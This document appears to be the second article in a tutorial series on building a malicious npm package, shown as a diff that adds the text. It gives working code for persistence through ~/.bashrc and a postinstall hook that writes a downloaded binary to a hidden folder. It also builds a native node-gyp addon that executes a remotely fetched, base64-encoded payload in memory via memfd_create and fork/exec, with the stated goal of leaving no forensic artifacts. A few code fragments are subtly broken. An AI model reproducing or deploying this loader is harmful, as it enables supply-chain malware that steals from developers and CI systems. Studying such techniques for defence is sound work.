@@ -1,0 +1,144 @@
+
+Picking up where we left off in the last article, it's time to start thinking about improving our situation. To recap, we've now got initial execution on a victim system, we're able to successfully steal credentials and access local files (among other things), but we've got a few critical limitations.
+From Walk to Run
+At this point, we've now gone two steps into the process: we've gained execution during the install, and also have a payload to grab some local credentials from the box - either credentials belonging to a developer working with our package, or injected credentials on a CI runner. In both cases, however, we have a number of significant limitations to deal with:
+
+We don't have the ability to run persistently. This means that once the install is done, and the user logs off, our malware no longer runs.
+Stealing credentials is bad (like, really bad). However, what if we encounter a bug, or wish we had additional functionality on-box? We are still pretty limited in terms of what we can do in a case like this.
+In order to address both issues, we will alter our simple "download-and-execute" to install us persistently, so we can continue to run at a later date, and perhaps add a bit more flexibility, so we are not simply restricted to running off of a postinstall hook. For the sake of brevity, we will normalize the platform we're working with to Linux/x86-64 (though the same processes and techniques will be relatively easy to port to MacOS and Windows, or have system-specific equivalents).
+Really, the two primary domains we'll be focused on here fall into the following buckets:
+Gaining Persistence
+In order to really extend our capability, we will likely first want to establish a persistent foothold on the system we gain execution on. This means that we don't simply want to run once, during the installation process, and then be forced to exit (for good) once the current user logs out.
+Extending our Tooling
+Ideally, the tools we put down during the installation process should be somewhat modular. If, at a later point, we wish to deploy more things to a remote system, we probably want the ability to do so. While we have some of that functionality from our previous work, it is fairly overt (wget + execute, download-and-eval), and we can almost certainly do better.
+Beginning the Process
+To facilitate these items, we'll start with some simple modifications to the code we wrote in the previous post. We'll start by adding persistence - keeping things as simple as possible in the first iteration - and simply add a line to the current user's .bashrc :
+nohup ~/.mostly_harmless/persist &
+We'll then add a new method to our malicious install script, allowing us to make that path (if it doesn't exist already), and then write our binary to run out to that path:
+const fs = require("fs");
+const pushFile = (contents, path = "~/.mostly_harmless") => {
+    if(!fs.existsSync(path))
+    fs.mkdirSync(path)
+    const full_path = path + "/persist";
+    fs.writeFileSync(full_path, contents);
+};
+And then modify our eval logic (from the 'end' event of our receive stream in the previous post) to do the following:
+res.on("end", () => {
+    fs.appendFileSync("~/.bashrc", rc_updates);
+    // Changed from `eval(tmp)`
+    pushFile(tmp);
+});
+This is about as simple as possible - a small addition that will allow us to re-launch each time the current user logs back in. This will certainly work, however, it is absolutely not the optimal solution: we've got some artifacts in the .bashrc, for one, but worse, we've also got to leave some artifacts on disk to allow us to re-run every time - alternatively, we could set up some sort of download-and-execute scheme (as before), which would let us check, and potentially leverage a payload (if desired).
+Improving Extensibility
+To recap, at this point we've got a very simple "download-and-eval" capability, and some very rudimentary persistence - now we'll look to make our execution capabilities better. In order to improve on this, we probably want to shift away from very overt execution capabilities; this means that simple "download-and-execute" strategies are out. Additionally, we probably want consider pivoting out of the process we start out in. While there are many ways to accomplish these goals, we will look to a simple, efficient solution: Native extensions to node.
+Building Our Extension
+So first, why consider a native extension for this particular function? In essence, native extensions appear in lots of packages, and they are rather opaque. Additionally, node's general API has some significant limitations for our purposes - in order to be able to pivot off into a new process, we will want to be able to modify system memory and utilize syscalls not exposed through the Javascript API.
+As it turns out, in order to facilitate this, node actually ships with its own build system - node-gyp - for building extensions, or "addons". We'll modify our package.json to the following:
+{
+    // ...
+    "scripts": {
+        // ...
+        "install": "node-gyp rebuild"
+    },
+    "gypfile": true
+}
+We'll then add a binding.gyp to define the build parameters for the actual extension as follows:
+{
+    "targets": [
+        {
+            "target_name": "mostlyharmless"
+            "sources": ["lib/mostlyharmless.cc"]
+        }
+    ]
+}
+From there, we'll set a simple goal - we want to perform roughly the same operation as before (our "download-and-eval"), but instead of simply running eval(...) on the retrieved code (assuming it to be Javascript), we'll instead start by:
+
+Base64-decode the retrieved buffer (Javascript)
+Leverage memfd
+Fork and execute
+This process will let us migrate to a new process to run our retrieved shellcode, all without touching disk.
+To begin, we'll write our native extension, using the updated package.json and binding.gyp (above):
+#include <node.h>
+namespace mostly_harmless {
+    void run(const v8::FunctionCallbackInfo<v8::Value>& args)
+    {
+        // TODO: Bad stuff.
+    
+    void init(v8::Local<v8::Object> exports)
+    {
+        NODE_SET_METHOD(exports, "run", run);
+    }
+    NODE_MODULE(NODE_GYP_MODULE_NAME, init)
+}
+Once we have this building, we can utilize it in our code as follows:
+const mh=require("./build/release/mostlyharmless" );
+    mh.run();
+At this point, we now have a shell of a more sophisticated path to executing retrieved code. We will begin by adding some logic to help get us reflective execution, and then work to make our malicious package a little better.
+Reflective Execution
+So what does reflective execution really mean? Essentially, we want to run entirely in-memory - leaving no forensic artifacts on-disk for discovery. The process for this varies quite a bit from platform to platform, but on Linux (for kernel versions >= 3.17), we can leverage the memfd facilities to gain execution.
+So what is memfd? In kernel 3.17, a new system call was introduced - this syscall allowed for the creation of an anonymous file; that is to say, a file backed only by memory. It has some legitimate uses, and certainly has some interesting features, but a happy side effect of this (at least for us) is that it allows us to execute a file directly from memory. In order to leverage this new functionality, we could simply leverage memfd_create - this, however, may actually be arbitrarily limiting, as we are now not just constrained by kernel version (>= 3.17), but also by the glibc version. Instead of this, we can simply leverage the syscall directly, and essentially achieve the same effect. Once we've got that, we can essentially fork and execute the file descriptor, and we will have successfully executed a file reflectively. Putting this all together, we get something like the following:
+// Simple fork + exec
+static int fork_exec_file(const char* path)
+{
+    char* argv[] = {"", NULL};
+    pid_t child = 0;
+    
+    if(-1 == (child = fork())) {
+        return -3;
+    }
+    
+    if(0 == child) 
+    execv(path, argv);
+    return 0;
+}
+
+int run_reflective(const void* buf, size_t size)
+{
+    char path[32] = {0};
+    int status = 0;
+    int fd = 0;
+    
+    // Attempt to create an anonymous file
+    if(0 > (fd = syscall(__NR_memfd_create, "", 0x01))) {
+        return -1;
+    }
+    
+    // Write our executable buffer to the FD
+    if(0 > write(fd, buf, size)) {
+        status = -2;
+        goto cleanup;
+    }
+    
+    // Set the file path so that we can execute
+    // our file by descriptor
+    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
+    
+    status = fork_exec_file(path);
+    cleanup:
+    close(fd);
+    return status;
+}
+Incorporating Our Loading Method
+Putting it all together, we might have something resembling the following (after updating our previously-exposed run method):
+void run(const v8::FunctionCallbackInfo<v8::Value>& args)
+{
+    // Get our buffer and size
+    unsigned char* buf = reinterpret_cast<unsigned char*>(node::Buffer::Data(args[0]->ToObject()));
+    size_t size = args[1]->Uint32Value();
+    // Reflectively execute
+    int res = run_reflective(buf, size);
+
+    // Return the result
+    v8::Isolate* isolate = args.GetIsolate();
+    args.GetReturnValue()
+    .Set(v8::String::NewFromUtf8(
+        isolate, (res >= 0) ? "Success" : "Fail").ToLocalChecked()
+    );
+}
+which we can then invoke from Javascript by receiving our executable binary (as a Base64 encoded string), decoding it, and then passing it into our "reflective load" method. So with that, we will update our "on end" handler yet again:
+res.on("end", () => {
+    let buf = new Buffer(tmp, 'base64');
+    mh.run(buf, buf.length);
+});
+Next Steps
+Now we've covered our bases from the perspective of malicious dependencies (at least, malicious dependencies that run on-host). We'll continue the discussion in the next article with a focus on what we can do in-browser!
